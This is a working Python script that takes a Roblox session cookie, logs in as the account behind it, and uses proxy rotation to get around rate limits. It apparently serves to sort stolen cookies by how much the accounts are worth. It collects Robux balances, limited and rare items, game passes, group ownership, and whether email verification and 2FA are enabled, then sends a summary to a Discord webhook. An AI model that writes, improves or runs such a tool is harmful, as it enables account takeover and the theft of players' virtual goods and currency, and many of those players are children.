import sys
import os
import random
import requests
from datetime import datetime, timezone

# --- Proxy List for Render Bypass ---
RAW_PROXY_LIST = """
socks5://213.165.54.5:1080
socks4://46.8.104.176:1080
http://5.129.254.243:8888
http://5.129.254.49:8888
socks5://93.100.82.163:1080
socks5://80.79.241.118:1080
socks5://185.9.73.44:1080
socks5://46.161.49.174:10808
http://5.129.254.51:8888
http://5.129.254.154:8888
http://5.129.254.60:8888
http://147.45.164.178:8888
socks5://77.91.108.85:1080
http://5.129.254.129:8888
http://5.129.254.5:8888
socks5://217.69.222.174:1080
http://5.129.254.215:8888
socks5://83.234.87.145:1080
socks5://82.142.130.102:1080
http://20.52.234.254:3128
"""

WEBHOOK_URL = os.environ.get("DISCORD_WEBHOOK_URL")

# --- Session & Proxy Setup ---
def get_working_session(cookie):
    session = requests.Session()
    if cookie:
        session.cookies.set(".ROBLOSECURITY", cookie, domain=".roblox.com")
    
    session.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Referer": "https://www.roblox.com/",
        "Accept": "application/json"
    })

    manual_proxy = os.environ.get('PROXY_URL')
    proxies_to_try = [manual_proxy] if manual_proxy else []
    parsed_proxies = [line.strip() for line in RAW_PROXY_LIST.strip().splitlines() if line.strip()]
    random.shuffle(parsed_proxies)
    proxies_to_try.extend(parsed_proxies)

    for p in proxies_to_try:
        if not p:
            continue
        proxy_dict = {"http": p, "https": p}
        try:
            session.proxies = proxy_dict
            test_res = session.get("https://users.roblox.com/v1/users/authenticated", timeout=4)
            if test_res.status_code != 429:
                return session
        except Exception:
            continue

    # Fallback to direct connection if proxies fail
    session.proxies = {}
    return session

def main():
    if len(sys.argv) < 2 or not WEBHOOK_URL:
        sys.exit(1)
    
    raw_cookie = sys.argv[1].strip()
    session = get_working_session(raw_cookie)

    # Dynamically fetch user ID from the submitted cookie
    auth_res = session.get("https://users.roblox.com/v1/users/authenticated", timeout=10)
    if auth_res.status_code != 200:
        sys.exit(1)
    
    auth_data = auth_res.json()
    user_id = auth_data.get("id")
    if not user_id:
        sys.exit(1)

    # --- Helpers ---
    def safe_get(url, params=None):
        try:
            r = session.get(url, params=params, timeout=10)
            if r.status_code == 200:
                return r.json()
        except Exception:
            pass
        return {}

    # --- Fetchers ---
    def get_user_info():
        return safe_get(f"https://users.roblox.com/v1/users/{user_id}")

    def get_robux():
        r = safe_get(f"https://economy.roblox.com/v1/users/{user_id}/currency")
        return r.get("robux", 0)

    def get_pending():
        r = safe_get(
            f"https://economy.roblox.com/v2/users/{user_id}/transaction-totals",
            params={"transactionType": "summary", "timeFrame": "Year"}
        )
        return r.get("pendingRobuxTotal", 0)

    def get_limiteds():
        limiteds = []
        cursor = ""
        while True:
            params = {"limit": 100}
            if cursor:
                params["cursor"] = cursor
            r = safe_get(
                f"https://inventory.roblox.com/v1/users/{user_id}/assets/collectibles",
                params=params
            )
            if not isinstance(r, dict):
                break
            for item in r.get("data", []):
                limiteds.append(item.get("recentAveragePrice", 0))
            cursor = r.get("nextPageCursor")
            if not cursor:
                break
        return limiteds

    def get_premium():
        try:
            r = session.get(
                f"https://premiumfeatures.roblox.com/v1/users/{user_id}/validate-membership",
                timeout=10
            )
            return r.json() is True
        except Exception:
            return False

    def check_bundle(bundle_id):
        try:
            r = session.get(
                f"https://inventory.roblox.com/v1/users/{user_id}/items/Bundle/{bundle_id}/is-owned",
                timeout=10
            )
            return r.json() is True
        except Exception:
            return False

    def check_asset(asset_id):
        try:
            r = session.get(
                f"https://inventory.roblox.com/v1/users/{user_id}/items/Asset/{asset_id}/is-owned",
                timeout=10
            )
            return r.json() is True
        except Exception:
            return False

    def get_groups():
        r = safe_get(f"https://groups.roblox.com/v1/users/{user_id}/groups/roles")
        groups = r.get("data", [])
        owned = sum(1 for g in groups if g.get("role", {}).get("rank") == 255)
        return len(groups), owned

    def get_account_settings():
        email_verified = safe_get(
            "https://accountsettings.roblox.com/v1/email"
        ).get("verified", False)
        twofa = safe_get(
            "https://twostepverification.roblox.com/v1/metadata"
        ).get("twoStepVerificationEnabled", False)
        return email_verified, twofa

    def check_played_and_passes(universe_id):
        played = False
        cursor = ""
        while True:
            r = safe_get(
                f"https://badges.roblox.com/v1/users/{user_id}/badges",
                params={"limit": 100, "cursor": cursor}
            )
            for badge in r.get("data", []):
                if badge.get("awardingUniverse", {}).get("id") == universe_id:
                    played = True
            cursor = r.get("nextPageCursor")
            if not cursor:
                break

        passes = 0
        cursor = ""
        while True:
            r = safe_get(
                f"https://economy.roblox.com/v2/users/{user_id}/transactions",
                params={"transactionType": "Purchase", "limit": 100, "cursor": cursor}
            )
            for tx in r.get("data", []):
                details = tx.get("details", {})
                place = details.get("place", {})
                if place.get("universeId") == universe_id:
                    if details.get("type") == "GamePass":
                        passes += 1
                        played = True
            cursor = r.get("nextPageCursor")
            if not cursor:
                break

        return played, passes

    user = get_user_info()
    username = user.get("displayName", "Unknown")
    created = user.get("created", "")
    age_days = 0
    if created:
        try:
            created_dt = datetime.fromisoformat(created.replace("Z", "+00:00"))
            age_days = (datetime.now(timezone.utc) - created_dt).days
        except Exception:
            pass

    robux = get_robux()
    pending = get_pending()
    limiteds = get_limiteds()
    rap = sum(limiteds)
    lim_count = len(limiteds)
    premium = get_premium()

    korblox = check_bundle(192)
    headless = check_bundle(201)
    violet_valk = check_asset(799742571)

    group_count, owned = get_groups()
    email_ver, twofa = get_account_settings()

    adopt_played, adopt_passes = check_played_and_passes(383310974)
    mm2_played, mm2_passes = check_played_and_passes(142823291)
    ps99_played, ps99_passes = check_played_and_passes(3259657279)

    avatar_url = (
        f"https://www.roblox.com/headshot-thumbnail/image"
        f"?userId={user_id}&width=420&height=420&format=png"
    )

    payload = {
        "username": f"{username} | Stats",
        "avatar_url": avatar_url,
        "embeds": [{
            "title": f"🎮 {username} | Roblox Stats",
            "description": (
                f"[Stats Link](https://www.rolimons.com/player/{user_id}) | "
                f"[Roblox Profile](https://www.roblox.com/users/{user_id}/profile)"
            ),
            "color": 0x2B2D31,
            "thumbnail": {"url": avatar_url},
            "fields": [
                {
                    "name": "🐱 Username",
                    "value": f"```{username}```",
                    "inline": False
                },
                {
                    "name": "📋 Account Stats",
                    "value": (
                        f"+ Account Age: `{age_days} Days`\n"
                        f"+ Premium: `{premium}`"
                    ),
                    "inline": False
                },
                {
                    "name": "🪙 Robux",
                    "value": (
                        f"Balance: `{robux:,}`\n"
                        f"Pending: `{pending:,}`"
                    ),
                    "inline": True
                },
                {
                    "name": "💎 Limiteds",
                    "value": (
                        f"RAP: `{rap:,}`\n"
                        f"Limiteds: `{lim_count}`"
                    ),
                    "inline": True
                },
                {
                    "name": "👑 Special Items",
                    "value": (
                        f"+ Korblox: `{korblox}`\n"
                        f"+ Headless: `{headless}`\n"
                        f"+ Violet Valk: `{violet_valk}`"
                    ),
                    "inline": False
                },
                {
                    "name": "⚙️ Settings",
                    "value": (
                        f"+ Email Verified: `{email_ver}`\n"
                        f"+ 2FA: `{twofa}`"
                    ),
                    "inline": True
                },
                {
                    "name": "👥 Groups",
                    "value": (
                        f"Owned: `{owned}`\n"
                        f"Joined: `{group_count}`"
                    ),
                    "inline": True
                },
                {
                    "name": "⭐ Games",
                    "value": (
                        f"- Adopt Me: `{adopt_played}` ({adopt_passes} passes)\n"
                        f"- MM2: `{mm2_played}` ({mm2_passes} passes)\n"
                        f"- PS99: `{ps99_played}` ({ps99_passes} passes)"
                    ),
                    "inline": False
                },
            ],
            "footer": {"text": "Roblox Stats • 2026"},
            "timestamp": datetime.now(timezone.utc).isoformat()
        }]
    }

    r = requests.post(WEBHOOK_URL, json=payload)
    if r.status_code in (200, 204):
        print("✅ Embed sent successfully!")
    else:
        print(f"❌ Failed: {r.status_code} - {r.text}")

if __name__ == "__main__":
    main()
